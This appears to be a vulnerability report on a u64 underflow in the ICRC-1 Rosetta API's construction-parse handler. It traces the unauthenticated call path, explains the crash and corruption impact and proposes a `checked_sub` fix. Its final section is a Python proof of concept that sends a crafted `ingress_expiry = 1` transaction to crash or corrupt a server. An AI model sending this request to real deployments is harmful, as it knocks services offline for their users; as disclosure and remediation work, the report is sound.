### Title
Unguarded u64 Underflow in `handle_construction_parse` Allows Unauthenticated DoS (Panic) or Silent Metadata Corruption — (`rs/rosetta-api/icrc1/src/construction_api/utils.rs`)

### Summary

The `handle_construction_parse` function performs a plain u64 subtraction on an attacker-controlled `ingress_expiry` value with no underflow guard. Any unauthenticated HTTP client can submit a crafted CBOR-encoded transaction with `ingress_expiry = 1` to `/construction/parse`, triggering a panic in debug builds or silent wrapping corruption in release builds.

### Finding Description

In `handle_construction_parse`, the `ingress_start` metadata field is computed as:

```rust
ingress_start: ingress_expiry_start.map(|start| {
    start
        - (ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT).as_nanos()
            as u64
}),
``` [1](#0-0) 

The subtrahend is `(300s - 60s).as_nanos() as u64 = 240_000_000_000`. If `start` (the lowest `ingress_expiry` from the submitted transaction) is any value less than `240_000_000_000`, this is a u64 underflow. There is no `checked_sub`, `saturating_sub`, or range validation anywhere in the call chain before this point.

The full unauthenticated call path is:

1. **HTTP endpoint** — `construction_parse` in `endpoints.rs` accepts any `ConstructionParseRequest` with no authentication or expiry pre-validation: [2](#0-1) 

2. **Service layer** — `services::construction_parse` parses the raw transaction and extracts `ingress_expiry_start` directly from the attacker-supplied CBOR without any bounds check: [3](#0-2) 

3. **`get_lowest_ingress_expiry`** — returns the raw minimum `ingress_expiry` field from the envelope contents, fully attacker-controlled: [4](#0-3) 

4. **Unguarded subtraction** — the value flows directly into the bare `-` operator: [1](#0-0) 

For contrast, `handle_construction_submit` correctly uses `saturating_add` for similar timestamp arithmetic: [5](#0-4) 

### Impact Explanation

- **Debug builds**: Rust's default overflow checks cause an immediate `panic!`, crashing the Rosetta server process. Any unauthenticated client can repeatedly crash the server (persistent DoS).
- **Release builds**: Rust performs wrapping arithmetic. With `ingress_expiry = 1`, the result is `1 - 240_000_000_000 = u64::MAX - 239_999_999_998`, a garbage timestamp returned as `ingress_start` in the response metadata. Clients relying on this value for transaction construction receive silently corrupted data.

### Likelihood Explanation

The exploit requires only a single unauthenticated HTTP POST to `/construction/parse` with a CBOR-encoded `UnsignedTransaction` containing `ingress_expiry = 1`. No keys, credentials, or privileged access are needed. The CBOR format is documented and the `UnsignedTransaction` type is straightforward to construct.

### Recommendation

Replace the bare subtraction with `checked_sub` and return an error on underflow:

```rust
ingress_start: ingress_expiry_start.map(|start| {
    start.checked_sub(
        (ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT).as_nanos() as u64
    )
}).flatten(),
```

Or validate that `ingress_expiry_start >= (MAX_INGRESS_TTL - PERMITTED_DRIFT).as_nanos() as u64` before calling `handle_construction_parse`, returning an `Error::parsing_unsuccessful` if not.

### Proof of Concept

```python
import cbor2, requests, struct

# EnvelopeContent::Call with ingress_expiry = 1
envelope_content = {
    "request_type": "call",
    "canister_id": b'\x00' * 10,
    "method_name": "icrc1_transfer",
    "arg": b'DIDL\x00\x00',  # minimal candid
    "sender": b'\x04',
    "ingress_expiry": 1,  # triggers underflow
    "nonce": b'\x00',
}
unsigned_tx = {"envelope_contents": [envelope_content]}
tx_hex = cbor2.dumps(unsigned_tx).hex()

resp = requests.post("http://<rosetta-host>/construction/parse", json={
    "network_identifier": {"blockchain": "Internet Computer", "network": "<subnet>"},
    "signed": False,
    "transaction": tx_hex,
})
# Debug build: server panics (connection reset / 500)
# Release build: response contains ingress_start ≈ u64::MAX - 239_999_999_998
print(resp.status_code, resp.text)
```

### Citations

**File:** rs/rosetta-api/icrc1/src/construction_api/utils.rs (L61-61)
```rust
    let valid_ingress_end: u64 = now.saturating_add(ic_limits::MAX_INGRESS_TTL.as_nanos() as u64);
```

**File:** rs/rosetta-api/icrc1/src/construction_api/utils.rs (L520-524)
```rust
                    ingress_start: ingress_expiry_start.map(|start| {
                        start
                            - (ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT).as_nanos()
                                as u64
                    }),
```

**File:** rs/rosetta-api/icrc1/src/construction_api/endpoints.rs (L109-119)
```rust
pub async fn construction_parse(
    State(state): State<Arc<MultiTokenAppState>>,
    Json(request): Json<ConstructionParseRequest>,
) -> Result<Json<ConstructionParseResponse>> {
    let state = get_state_from_network_id(&request.network_identifier, &state)
        .map_err(|err| Error::invalid_network_id(&err))?;
    Ok(Json(services::construction_parse(
        request.transaction,
        request.signed,
        state.metadata.clone().into(),
    )?))
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L196-231)
```rust
pub fn construction_parse(
    transaction_string: String,
    transaction_is_signed: bool,
    currency: Currency,
) -> Result<ConstructionParseResponse, Error> {
    let (ingress_expiry_start, ingress_expiry_end, envelope_contents) = if transaction_is_signed {
        let signed_transaction = SignedTransaction::from_str(&transaction_string)
            .map_err(|err| Error::parsing_unsuccessful(&err))?;
        (
            signed_transaction.get_lowest_ingress_expiry(),
            signed_transaction.get_highest_ingress_expiry(),
            signed_transaction
                .envelopes
                .into_iter()
                .map(|envelope| envelope.content.into_owned())
                .collect(),
        )
    } else {
        let unsigned_transaction = UnsignedTransaction::from_str(&transaction_string)
            .map_err(|err| Error::parsing_unsuccessful(&err))?;
        (
            unsigned_transaction.get_lowest_ingress_expiry(),
            unsigned_transaction.get_highest_ingress_expiry(),
            unsigned_transaction.envelope_contents,
        )
    };

    handle_construction_parse(
        envelope_contents,
        currency,
        ingress_expiry_start,
        ingress_expiry_end,
        transaction_is_signed,
    )
    .map_err(|err| Error::processing_construction_failed(&err))
}
```

**File:** rs/rosetta-api/icrc1/src/construction_api/types.rs (L163-168)
```rust
    pub fn get_lowest_ingress_expiry(&self) -> Option<u64> {
        self.envelope_contents
            .iter()
            .map(|ec: &EnvelopeContent| ec.ingress_expiry())
            .min()
    }
```
